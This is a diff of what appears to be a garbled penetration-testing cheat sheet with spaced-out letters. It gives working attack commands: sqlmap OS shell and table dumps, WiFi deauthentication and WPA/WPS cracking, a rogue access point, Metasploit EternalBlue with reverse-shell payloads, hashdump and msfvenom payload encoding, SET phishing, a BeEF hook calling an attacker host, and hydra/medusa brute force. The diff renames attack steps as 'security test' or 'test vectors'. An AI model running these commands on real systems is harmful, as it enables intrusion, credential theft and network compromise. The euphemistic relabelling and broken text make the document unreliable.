-#  S t e a l t h  s c a n n i n g  w i t h  d e l a y s
-n i k t o  - h  h t t p : / / t a r g e t . c o m  - P a u s e  2  - T  x  6  
-#  S c a n  t h r o u g h  p r o x y
-n i k t o  - h  h t t p : / / t a r g e t . c o m  - u s e p r o x y  h t t p : / / l o c a l h o s t : 8 0 8 0  
-#  C u s t o m  u s e r  a g e n t  a n d  c o o k i e s
-n i k t o  - h  h t t p : / / t a r g e t . c o m  - u s e r a g e n t  " M o z i l l a / 5 . 0 "  - c o o k i e  " s e s s i o n = a b c 1 2 3 "  
-#  S S L / T L S  t e s t i n g  
-#  B a s i c  S Q L  i n j e c t i o n  t e s t
-s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - b a t c h  - - r i s k = 3  - - l e v e l = 5  
-#  P O S T  r e q u e s t  t e s t i n g
+Web server vulnerability scanner:
+Automated SQL injection detection and defensive validation tool:
+# Comprehensive scan
+n i k t o  - h  h t t p : / / t a r g e t . c o m  - o  n i k t o _ r e p o r t . h t m l  - F o r m a t  h t m
+# Scan with specific plugins
+n i k t o  - h  h t t p : / / t a r g e t . c o m  - P l u g i n s  " a p a c h e _ e x p e c t _ x s s , s u b d o m a i n "
+# Stealth scanning with delays
+n i k t o  - h  h t t p : / / t a r g e t . c o m  - P a u s e  2  - T  x  6
+# Scan through proxy
+n i k t o  - h  h t t p : / / t a r g e t . c o m  - u s e p r o x y  h t t p : / / l o c a l h o s t : 8 0 8 0
+# Custom user agent and cookies
+n i k t o  - h  h t t p : / / t a r g e t . c o m  - u s e r a g e n t  " M o z i l l a / 5 . 0 "  - c o o k i e  " s e s s i o n = a b c 1 2 3 "
+#  S S L / T L S  t e s t i n g
+# Basic SQL injection test
+s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - b a t c h  - - r i s k = 3  - - l e v e l = 5
+# POST request testing
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / l o g i n "  - - d a t a = " u s e r n a m e = a d m i n & p a s s w o r d = t e s t "
-- - m e t h o d = P O S T  
-#  C o o k i e - b a s e d  i n j e c t i o n
-s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p r o f i l e "  - - c o o k i e = " s e s s i o n = a b c 1 2 3 "  - - b a t c h  
-#  D a t a b a s e  e n u m e r a t i o n
+- - m e t h o d = P O S T
+# C o o k i e - b a s e d injection
+s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p r o f i l e "  - - c o o k i e = " s e s s i o n = a b c 1 2 3 "  - - b a t c h
+# Database enumeration
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - d b s
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - D  d a t a b a s e _ n a m e  - - t a b l e s
-s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - D  d a t a b a s e _ n a m e  - T  u s e r s  - - d u m p  
-#  A d v a n c e d  e v a s i o n  t e c h n i q u e s
+s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - D  d a t a b a s e _ n a m e  - T  u s e r s  - - d u m p
+# Advanced evasion techniques
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - t a m p e r = s p a c e 2 c o m m e n t , c h a r e n c o d e
-- - r a n d o m - a g e n t  
-#  O S  s h e l l  a c c e s s
-s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - o s - s h e l l  
-#  P r o x y  a n d  T O R  u s a g e
+- - r a n d o m - a g e n t
+# OS shell access
+s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - o s - s h e l l
+# Proxy and TOR usage
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - p r o x y = " h t t p : / / 1 2 7 . 0 . 0 . 1 : 8 0 8 0 "  - - t o r
-- - c h e c k - t o r  
-9. Nikto  
-
-n i k t o  - h  h t t p s : / / t a r g e t . c o m  - s s l  - T u n i n g  9  
-#  B a s i c  d i r e c t o r y  e n u m e r a t i o n
-d i r b  h t t p : / / t a r g e t . c o m  / u s r / s h a r e / w o r d l i s t s / d i r b / c o m m o n . t x t  
-#  R e c u r s i v e  s c a n n i n g  w i t h  e x t e n s i o n s
-d i r b  h t t p : / / t a r g e t . c o m  - r  - X  . p h p , . t x t , . b a k  
-#  C u s t o m  w o r d l i s t  w i t h  a u t h e n t i c a t i o n
-d i r b  h t t p : / / t a r g e t . c o m  / c u s t o m / w o r d l i s t . t x t  - a  " a d m i n : p a s s w o r d "  
-#  N o n - r e c u r s i v e  w i t h  s p e c i f i c  s t a t u s  c o d e s
-d i r b  h t t p : / / t a r g e t . c o m  - N  - z  2 0 0 , 3 0 1 , 3 0 2  
-#  P r o x y  u s a g e  w i t h  c u s t o m  h e a d e r s
-d i r b  h t t p : / / t a r g e t . c o m  - p  h t t p : / / l o c a l h o s t : 8 0 8 0  - H  " X - C u s t o m - H e a d e r :  v a l u e "  
-#  S a v e  o u t p u t  a n d  c o n t i n u e  s c a n
-d i r b  h t t p : / / t a r g e t . c o m  - o  s c a n _ r e s u l t s . t x t  - w  
-#  E n a b l e  m o n i t o r  m o d e
-a i r m o n - n g  s t a r t  w l a n 0  
-#  C a p t u r e  p a c k e t s
-a i r o d u m p - n g  w l a n 0 m o n  
-#  T a r g e t  s p e c i f i c  n e t w o r k
-a i r o d u m p - n g  - c  6  - - b s s i d  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - w  c a p t u r e  w l a n 0 m o n  
-#  D e a u t h e n t i c a t i o n  a t t a c k
-a i r e p l a y - n g  - 0  1 0  - a  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - c  6 6 : 7 7 : 8 8 : 9 9 : A A : B B  w l a n 0 m o n  
-#  W E P  c r a c k i n g
+- - c h e c k - t o r
+9. Nikto
+n i k t o  - h  h t t p s : / / t a r g e t . c o m  - s s l  - T u n i n g  9
+# Basic directory enumeration
+d i r b  h t t p : / / t a r g e t . c o m  / u s r / s h a r e / w o r d l i s t s / d i r b / c o m m o n . t x t
+# Recursive scanning with extensions
+d i r b  h t t p : / / t a r g e t . c o m  - r  - X  . p h p , . t x t , . b a k
+# Custom wordlist with authentication
+d i r b  h t t p : / / t a r g e t . c o m  / c u s t o m / w o r d l i s t . t x t  - a  " a d m i n : p a s s w o r d "
+# N o n - r e c u r s i v e with specific status codes
+d i r b  h t t p : / / t a r g e t . c o m  - N  - z  2 0 0 , 3 0 1 , 3 0 2
+# Proxy usage with custom headers
+d i r b  h t t p : / / t a r g e t . c o m  - p  h t t p : / / l o c a l h o s t : 8 0 8 0  - H  " X - C u s t o m - H e a d e r :  v a l u e "
+# Save output and continue scan
+d i r b  h t t p : / / t a r g e t . c o m  - o  s c a n _ r e s u l t s . t x t  - w
+# Enable monitor mode
+a i r m o n - n g start w l a n 0
+# Capture packets
+a i r o d u m p - n g w l a n 0 m o n
+# Target specific network
+a i r o d u m p - n g  - c  6  - - b s s i d  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - w  c a p t u r e  w l a n 0 m o n
+# Deauthentication security test
+a i r e p l a y - n g  - 0  1 0  - a  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - c  6 6 : 7 7 : 8 8 : 9 9 : A A : B B  w l a n 0 m o n
+# WEP cracking
 a i r e p l a y - n g  - 1  0  - a  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - h  6 6 : 7 7 : 8 8 : 9 9 : A A : B B  - e  " N e t w o r k N a m e "
-w l a n 0 m o n  
-10. Dirb/Dirbuster  
-11. Aircrack-ng Suite  
-Directoryandfilebrute-forcing tools:  
-Comprehensivewirelesssecurity testing framework:  
-W i r e l e s s  S e c u r i t y  T e s t i n g  T o o l s  
-
-#  S c a n  f o r  W P S - e n a b l e d  n e t w o r k s
-w a s h  - i  w l a n 0 m o n  
-#  R e a v e r  W P S  a t t a c k
-r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - v v  - K  1  
-#  B u l l y  W P S  a t t a c k  w i t h  p i x i e  d u s t
-b u l l y  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - d  - v  3  
-#  A d v a n c e d  R e a v e r  o p t i o n s
-r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - v v  - N  - S  - L  - d  1  - r  3 : 1 5  
-#  C u s t o m  P I N  a t t e m p t s
-r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - p  1 2 3 4 5 6 7 0  
+w l a n 0 m o n
+10. Dirb/Dirbuster
+11. Aircrack-ng Suite
+Directoryandfilebrute-forcing tools:
+Comprehensivewirelesssecurity testing framework:
+Wireless Security Testing Tools
+# Scan for W P S - e n a b l e d networks
+wash - i w l a n 0 m o n
+# Reaver WPS security test
+r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - v v  - K  1
+# Bully WPS security test with pixie dust
+b u l l y  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - d  - v  3
+# Advanced Reaver options
+r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - v v  - N  - S  - L  - d  1  - r  3 : 1 5
+# Custom PIN attempts
+r e a v e r  - i  w l a n 0 m o n  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - p  1 2 3 4 5 6 7 0
 a i r e p l a y - n g  - 3  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - h  6 6 : 7 7 : 8 8 : 9 9 : A A : B B  w l a n 0 m o n
-a i r c r a c k - n g  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  c a p t u r e * . c a p  
+a i r c r a c k - n g  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  c a p t u r e * . c a p
 #  W P A / W P A 2  c r a c k i n g
 a i r c r a c k - n g  - w  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  - b  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5
-c a p t u r e * . c a p  
-#  C r e a t e  f a k e  a c c e s s  p o i n t
-a i r b a s e - n g  - a  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - - e s s i d  " F r e e W i F i "  - c  6  w l a n 0 m o n  
-#  A u t o m a t e d  a t t a c k  o n  a l l  n e t w o r k s
-w i f i t e  
-#  T a r g e t  s p e c i f i c  e n c r y p t i o n  t y p e s
-w i f i t e  - - w e p  - - w p a  
-#  C u s t o m  t i m e o u t  a n d  r e q u i r e m e n t s
-w i f i t e  - - w p a  - - w p a t  6 0 0  - - w p a d t  6 0  - - d i c t  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  
-#  S p e c i f i c  c h a n n e l  a n d  p o w e r  t h r e s h o l d
-w i f i t e  - c  6  - - p o w e r  5 0  
-#  W P S  a t t a c k s  o n l y  
-13. Wifite  
-12. Reaver/Bully  
-WPSPINbrute-forcetools:  
-Automatedwireless diagnostic run tool:  
-
-w i f i t e  - - w p s  - - w p s - r a t i o  3  - - w p s - t i m e  6 0 0  
-#  S t a r t  M e t a s p l o i t  c o n s o l e
-m s f c o n s o l e  
-#  D a t a b a s e  i n i t i a l i z a t i o n
-m s f d b  i n i t  
-#  S e a r c h  f o r  e x p l o i t s
-s e a r c h  t y p e : e x p l o i t  p l a t f o r m : w i n d o w s  s m b  
-#  U s e  e x p l o i t  m o d u l e
+c a p t u r e * . c a p
+# Create fake access point
+a i r b a s e - n g  - a  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  - - e s s i d  " F r e e W i F i "  - c  6  w l a n 0 m o n
+# Automated security test on all networks
+wifite
+# Target specific encryption types
+wifite - - w e p - - w p a
+# Custom timeout and requirements
+w i f i t e  - - w p a  - - w p a t  6 0 0  - - w p a d t  6 0  - - d i c t  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t
+# Specific channel and power threshold
+wifite - c 6 - - p o w e r 5 0
+# WPS security test only
+13. Wifite
+12. Reaver/Bully
+WPSPINbrute-forcetools:
+Automatedwireless diagnostic run tool:
+wifite - - w p s - - w p s - r a t i o 3 - - w p s - t i m e 6 0 0
+# Start Metasploit console
+msfconsole
+# Database initialization
+msfdb init
+# Search for exploits
+search t y p e : e x p l o i t p l a t f o r m : w i n d o w s smb
+# Use validate module
 u s e  e x p l o i t / w i n d o w s / s m b / m s 1 7 _ 0 1 0 _ e t e r n a l b l u e
-s h o w  o p t i o n s
+show options
 s e t  R H O S T S  1 9 2 . 1 6 8 . 1 . 1 0 0
 s e t  L H O S T  1 9 2 . 1 6 8 . 1 . 5 0
 s e t  P A Y L O A D  w i n d o w s / x 6 4 / m e t e r p r e t e r / r e v e r s e _ t c p
-e x p l o i t  
-#  P o s t - e x p l o i t a t i o n
-s e s s i o n s  - l
-s e s s i o n s  - i  1
-s y s i n f o
-h a s h d u m p
-g e t s y s t e m
-m i g r a t e  - N  e x p l o r e r . e x e  
-#  A u x i l i a r y  m o d u l e s
+validate
+# P o s t - e x p l o i t a t i o n
+sessions - l
+sessions - i 1
+sysinfo
+hashdump
+getsystem
+migrate - N e x p l o r e r . e x e
+# Auxiliary modules
 u s e  a u x i l i a r y / s c a n n e r / s m b / s m b _ v e r s i o n
 s e t  R H O S T S  1 9 2 . 1 6 8 . 1 . 0 / 2 4
-r u n  
-#  G e n e r a t e  p a y l o a d s
+r u n
+# Generate test vectors
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 5 0  L P O R T = 4 4 4 4  - f e x e
->  p a y l o a d . e x e
+> p a y l o a d . e x e
 m s f v e n o m  - p  l i n u x / x 8 6 / s h e l l _ r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 5 0  L P O R T = 4 4 4 4  - f  e l f &gt;
-p a y l o a d . e l f  
-#  E n c o d e  p a y l o a d s
+p a y l o a d . e l f
+# Encode test vectors
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 5 0  L P O R T = 4 4 4 4  - e
-x 8 6 / s h i k a t a _ g a _ n a i  - i  5  - f  e x e  &gt;  e n c o d e d _ p a y l o a d . e x e  
-E x p l o i t a t i o n  F r a m e w o r k  T o o l s  
-14. Metasploit Framework  
-Theworld'smostusedpenetrationtesting framework:  
-
-16. Social Engineering Toolkit (SET)  
-15. BeEF (Browser Exploitation Framework)  
+x 8 6 / s h i k a t a _ g a _ n a i  - i  5  - f  e x e  &gt;  e n c o d e d _ p a y l o a d . e x e
+defensive validation Framework Tools
+14. Metasploit Framework
+Theworld'smostusedpenetrationtesting framework:
+16. Social Engineering Toolkit (SET)
+15. BeEF (Browser defensive validation Framework)
 Browser-focusedexploitationframework:
 Comprehensivesocialengineeringframework:
-#  L a u n c h  S E T
-s e t o o l k i t  
-#  C r e a t e  p h i s h i n g  a t t a c k
+# Launch SET
+setoolkit
+# Create phishing security test
 #  1 )  S o c i a l - E n g i n e e r i n g  A t t a c k s
 #  2 )  W e b s i t e  A t t a c k  V e c t o r s
 #  3 )  C r e d e n t i a l  H a r v e s t e r  A t t a c k  M e t h o d
-#  2 )  S i t e  C l o n e r  
-#  P o w e r S h e l l  a t t a c k  v e c t o r
+#  2 )  S i t e  C l o n e r
+# PowerShell security test vector
 #  1 )  S o c i a l - E n g i n e e r i n g  A t t a c k s
 #  9 )  P o w e r S h e l l  A t t a c k  V e c t o r s
-#  1 )  P o w e r S h e l l  A l p h a n u m e r i c  S h e l l c o d e  I n j e c t o r  
+#  1 )  P o w e r S h e l l  A l p h a n u m e r i c  S h e l l c o d e  I n j e c t o r
 #  I n f e c t i o u s  m e d i a  g e n e r a t o r  #  1 )
 S o c i a l - E n g i n e e r i n g  A t t a c k s  #  3 )
 I n f e c t i o u s  M e d i a  G e n e r a t o r  #  2 )
-S t a n d a r d  M e t a s p l o i t  E x e c u t a b l e  
-#  M a s s  m a i l e r  a t t a c k  
-#  S t a r t  B e E F
-b e e f - x s s  
-#  H o o k  b r o w s e r s  w i t h  J a v a S c r i p t
-< s c r i p t  s r c = " h t t p : / / a t t a c k e r - i p : 3 0 0 0 / h o o k . j s " &gt; < / s c r i p t &gt;  
-#  R E S T  A P I  u s a g e
-c u r l  - H  " C o n t e n t - T y p e :  a p p l i c a t i o n / j s o n "  - X  P O S T  - d  ' { " u s e r n a m e " : " b e e f " ,
-" p a s s w o r d " : " b e e f " } '  h t t p : / / 1 2 7 . 0 . 0 . 1 : 3 0 0 0 / a p i / a d m i n / l o g i n  
-#  C o m m a n d  m o d u l e  e x e c u t i o n  v i a  A P I
-c u r l  - H  " C o n t e n t - T y p e :  a p p l i c a t i o n / j s o n "  - X  P O S T  - d  ' { " h b " : " o n l i n e - b r o w s e r - i d " } '
-h t t p : / / 1 2 7 . 0 . 0 . 1 : 3 0 0 0 / a p i / m o d u l e s / b r o w s e r / h o o k e d _ d o m a i n / c o m m a n d  
-#  I n t e g r a t i o n  w i t h  M e t a s p l o i t
-#  I n  B e E F :  C o n f i g u r e  M e t a s p l o i t  e x t e n s i o n
-#  I n  M S F :  l o a d  m s g r p c  S e r v e r H o s t = 1 2 7 . 0 . 0 . 1  P a s s = a b c 1 2 3  
-
+Standard Metasploit Executable
+# Mass mailer security test
+# Start BeEF
+b e e f - x s s
+# Hook browsers with JavaScript
+&lt; s c r i p t  s r c = " h t t p : / / a t t a c k e r - i p : 3 0 0 0 / h o o k . j s " &gt; &lt; / s c r i p t &gt;
+# REST API usage
+c u r l  - H  " C o n t e n t - T y p e :  a p p l i c a t i o n / j s o n "  - X  P O S T  - d  ' &#123; " u s e r n a m e " : " b e e f " ,
+" p a s s w o r d " : " b e e f " &#125; '  h t t p : / / 1 2 7 . 0 . 0 . 1 : 3 0 0 0 / a p i / a d m i n / l o g i n
+# Command module execution via API
+c u r l  - H  " C o n t e n t - T y p e :  a p p l i c a t i o n / j s o n "  - X  P O S T  - d  ' &#123; " h b " : " o n l i n e - b r o w s e r - i d " &#125; '
+h t t p : / / 1 2 7 . 0 . 0 . 1 : 3 0 0 0 / a p i / m o d u l e s / b r o w s e r / h o o k e d _ d o m a i n / c o m m a n d
+# Integration with Metasploit
+# In B e E F : Configure Metasploit extension
+#  I n  M S F :  l o a d  m s g r p c  S e r v e r H o s t = 1 2 7 . 0 . 0 . 1  P a s s = a b c 1 2 3
 #  5 )  M a s s  M a i l e r  A t t a c k
-#  C o n f i g u r e  S M T P  s e t t i n g s  a n d  t a r g e t  l i s t  
-#  B e n c h m a r k  s y s t e m
-h a s h c a t  - b  
-#  D i c t i o n a r y  a t t a c k
-h a s h c a t  - m  0  - a  0  h a s h e s . t x t  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  
-#  B r u t e  f o r c e  w i t h  m a s k
-h a s h c a t  - m  0  - a  3  h a s h e s . t x t  ? l ? l ? l ? l ? l ? l ? l ? l  
-#  C o m b i n a t i o n  a t t a c k  
-#  B a s i c  p a s s w o r d  c r a c k i n g
-j o h n  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  h a s h e s . t x t  
-#  S h o w  c r a c k e d  p a s s w o r d s
-j o h n  - - s h o w  h a s h e s . t x t  
-#  I n c r e m e n t a l  m o d e
-j o h n  - - i n c r e m e n t a l : A l p h a  h a s h e s . t x t  
-#  C u s t o m  r u l e s
-j o h n  - - w o r d l i s t = w o r d l i s t . t x t  - - r u l e s = b e s t 6 4  h a s h e s . t x t  
-#  S p e c i f i c  h a s h  f o r m a t
-j o h n  - - f o r m a t = r a w - m d 5  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  m d 5 _ h a s h e s . t x t  
-#  M u l t i - c o r e  p r o c e s s i n g
-j o h n  - - f o r k = 4  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  h a s h e s . t x t  
-#  S e s s i o n  m a n a g e m e n t
+# Configure SMTP settings and target list
+# Benchmark system
+hashcat - b
+# Dictionary security test
+h a s h c a t  - m  0  - a  0  h a s h e s . t x t  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t
+# Brute force with mask
+hashcat - m 0 - a 3 h a s h e s . t x t ? l ? l ? l ? l ? l ? l ? l ? l
+# Combination security test
+# Basic password cracking
+j o h n  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  h a s h e s . t x t
+# Show cracked passwords
+john - - s h o w h a s h e s . t x t
+# Incremental mode
+john - - i n c r e m e n t a l : A l p h a h a s h e s . t x t
+# Custom rules
+j o h n  - - w o r d l i s t = w o r d l i s t . t x t  - - r u l e s = b e s t 6 4  h a s h e s . t x t
+# Specific hash format
+j o h n  - - f o r m a t = r a w - m d 5  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  m d 5 _ h a s h e s . t x t
+# M u l t i - c o r e processing
+j o h n  - - f o r k = 4  - - w o r d l i s t = / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  h a s h e s . t x t
+# Session management
 j o h n  - - s e s s i o n = m y s e s s i o n  h a s h e s . t x t
-j o h n  - - r e s t o r e = m y s e s s i o n  
-P a s s w o r d  C r a c k i n g  a n d  A n a l y s i s  T o o l s  
-18. Hashcat  
-17. John the Ripper  
-Advancedpasswordcracking tool:  
-GPU-accelerated password recovery:  
-
-#  B a s i c  u s a g e  
-h a s h c a t  - m  0  - a  1  h a s h e s . t x t  w o r d l i s t 1 . t x t  w o r d l i s t 2 . t x t  
-#  R u l e - b a s e d  a t t a c k
-h a s h c a t  - m  0  - a  0  h a s h e s . t x t  w o r d l i s t . t x t  - r
-/ u s r / s h a r e / h a s h c a t / r u l e s / b e s t 6 4 . r u l e  
-#  H y b r i d  a t t a c k
-h a s h c a t  - m  0  - a  6  h a s h e s . t x t  w o r d l i s t . t x t  ? d ? d ? d ? d  
-#  S h o w  c r a c k e d  p a s s w o r d s
-h a s h c a t  - m  0  h a s h e s . t x t  - - s h o w  
-#  G P U  t e m p e r a t u r e  m o n i t o r i n g
-h a s h c a t  - m  0  - a  0  h a s h e s . t x t  w o r d l i s t . t x t  - - g p u - t e m p - a b o r t = 9 0  
-#  S S H  b r u t e  f o r c e
-h y d r a  - l  a d m i n  - P  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  H T T P  P O S T  f o r m
-h y d r a  - l  a d m i n  - P  p a s s w o r d s . t x t  1 9 2 . 1 6 8 . 1 . 1 0 0  h t t p - p o s t - f o r m
-" / l o g i n : u s e r n a m e = ^ U S E R ^ & p a s s w o r d = ^ P A S S ^ : I n v a l i d  c r e d e n t i a l s "  
-#  F T P  w i t h  m u l t i p l e  u s e r s
-h y d r a  - L  u s e r s . t x t  - P  p a s s w o r d s . t x t  f t p : / / 1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  S M B  a t t a c k
-h y d r a  - L  u s e r s . t x t  - P  p a s s w o r d s . t x t  s m b : / / 1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  C u s t o m  p o r t  a n d  t h r e a d s
-h y d r a  - s  2 2 2 2  - t  4  - l  r o o t  - P  p a s s w o r d s . t x t  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  R e s u m e  i n t e r r u p t e d  s e s s i o n
-h y d r a  - R  
-#  V e r b o s e  o u t p u t  w i t h  f o u n d  p a s s w o r d s  o n l y
-h y d r a  - l  a d m i n  - P  p a s s w o r d s . t x t  - f  - V  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0  
-19. Hydra  
-20. Medusa  
-Networklogin cracker:  
-Parallelnetworklogin brute-forcer:  
-
-#  S t a r t  O p e n V A S  s e r v i c e s
-g v m - s t a r t  
-#  U p d a t e  f e e d s
-g r e e n b o n e - f e e d - s y n c  
-#  C r e a t e  t a r g e t
-g v m - c l i  - - g m p - u s e r n a m e  a d m i n  - - g m p - p a s s w o r d  a d m i n  s o c k e t  - - x m l
-" < c r e a t e _ t a r g e t &gt; < n a m e &gt; T e s t
-T a r g e t < / n a m e &gt; < h o s t s &gt; 1 9 2 . 1 6 8 . 1 . 1 0 0 < / h o s t s &gt; < / c r e a t e _ t a r g e t &gt; "  
-#  C r e a t e  a n d  s t a r t  s c a n  t a s k
-g v m - c l i  - - g m p - u s e r n a m e  a d m i n  - - g m p - p a s s w o r d  a d m i n  s o c k e t  - - x m l
-" < c r e a t e _ t a s k &gt; < n a m e &gt; T e s t  S c a n < / n a m e &gt; < t a r g e t  i d = ' t a r g e t - i d ' / &gt; < s c a n n e r
-i d = ' s c a n n e r - i d ' / &gt; < c o n f i g  i d = ' c o n f i g - i d ' / &gt; < / c r e a t e _ t a s k &gt; "  
-#  C o m m a n d - l i n e  s c a n
+j o h n  - - r e s t o r e = m y s e s s i o n
+Password Cracking and Analysis Tools
+18. Hashcat
+17. John the Ripper
+Advancedpasswordcracking tool:
+GPU-accelerated password recovery:
+# Basic usage
+hashcat - m 0 - a 1 h a s h e s . t x t w o r d l i s t 1 . t x t w o r d l i s t 2 . t x t
+# R u l e - b a s e d security test
+hashcat - m 0 - a 0 h a s h e s . t x t w o r d l i s t . t x t - r
+/ u s r / s h a r e / h a s h c a t / r u l e s / b e s t 6 4 . r u l e
+# Hybrid security test
+hashcat - m 0 - a 6 h a s h e s . t x t w o r d l i s t . t x t ? d ? d ? d ? d
+# Show cracked passwords
+hashcat - m 0 h a s h e s . t x t - - s h o w
+# GPU temperature monitoring
+h a s h c a t  - m  0  - a  0  h a s h e s . t x t  w o r d l i s t . t x t  - - g p u - t e m p - a b o r t = 9 0
+# SSH brute force
+h y d r a  - l  a d m i n  - P  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0
+# HTTP POST form
+hydra - l admin - P p a s s w o r d s . t x t 1 9 2 . 1 6 8 . 1 . 1 0 0 h t t p - p o s t - f o r m
+" / l o g i n : u s e r n a m e = ^ U S E R ^ & p a s s w o r d = ^ P A S S ^ : I n v a l i d  c r e d e n t i a l s "
+# FTP with multiple users
+h y d r a  - L  u s e r s . t x t  - P  p a s s w o r d s . t x t  f t p : / / 1 9 2 . 1 6 8 . 1 . 1 0 0
+# SMB security test
+h y d r a  - L  u s e r s . t x t  - P  p a s s w o r d s . t x t  s m b : / / 1 9 2 . 1 6 8 . 1 . 1 0 0
+# Custom port and threads
+h y d r a  - s  2 2 2 2  - t  4  - l  r o o t  - P  p a s s w o r d s . t x t  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0
+# Resume interrupted session
+hydra - R
+# Verbose output with found passwords only
+h y d r a  - l  a d m i n  - P  p a s s w o r d s . t x t  - f  - V  s s h : / / 1 9 2 . 1 6 8 . 1 . 1 0 0
+19. Hydra
+20. Medusa
+Networklogin cracker:
+Parallelnetworklogin brute-forcer:
+# Start OpenVAS services
+g v m - s t a r t
+# Update feeds
+g r e e n b o n e - f e e d - s y n c
+# Create target
+g v m - c l i - - g m p - u s e r n a m e admin - - g m p - p a s s w o r d admin socket - - x m l
+" &lt; c r e a t e _ t a r g e t &gt; &lt; n a m e &gt; T e s t
+T a r g e t &lt; / n a m e &gt; &lt; h o s t s &gt; 1 9 2 . 1 6 8 . 1 . 1 0 0 &lt; / h o s t s &gt; &lt; / c r e a t e _ t a r g e t &gt; "
+# Create and start scan task
+g v m - c l i - - g m p - u s e r n a m e admin - - g m p - p a s s w o r d admin socket - - x m l
+" &lt; c r e a t e _ t a s k &gt; &lt; n a m e &gt; T e s t  S c a n &lt; / n a m e &gt; &lt; t a r g e t  i d = ' t a r g e t - i d ' / &gt; &lt; s c a n n e r
+i d = ' s c a n n e r - i d ' / &gt; &lt; c o n f i g  i d = ' c o n f i g - i d ' / &gt; &lt; / c r e a t e _ t a s k &gt; "
+# C o m m a n d - l i n e scan
 g v m - c l i  - - g m p - u s e r n a m e  a d m i n  - - g m p - p a s s w o r d  a d m i n  s o c k e t  - - c m d = " g e t _ r e p o r t s
-r e p o r t _ i d "  
-m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - P  p a s s w o r d s . t x t  - M  s s h  
-#  M u l t i p l e  h o s t s
-m e d u s a  - H  h o s t s . t x t  - u  a d m i n  - P  p a s s w o r d s . t x t  - M  s s h  
-#  C u s t o m  p o r t  a n d  t h r e a d s
-m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - n  2 2 2 2  - u  r o o t  - P  p a s s w o r d s . t x t  - t  1 0  - M  s s h  
-#  S t o p  o n  s u c c e s s
-m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - P  p a s s w o r d s . t x t  - M  s s h  - f  
-#  T e s t  s p e c i f i c  c r e d e n t i a l s
-m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - p  p a s s w o r d 1 2 3  - M  s s h  
-#  M u l t i p l e  s e r v i c e s  s c a n
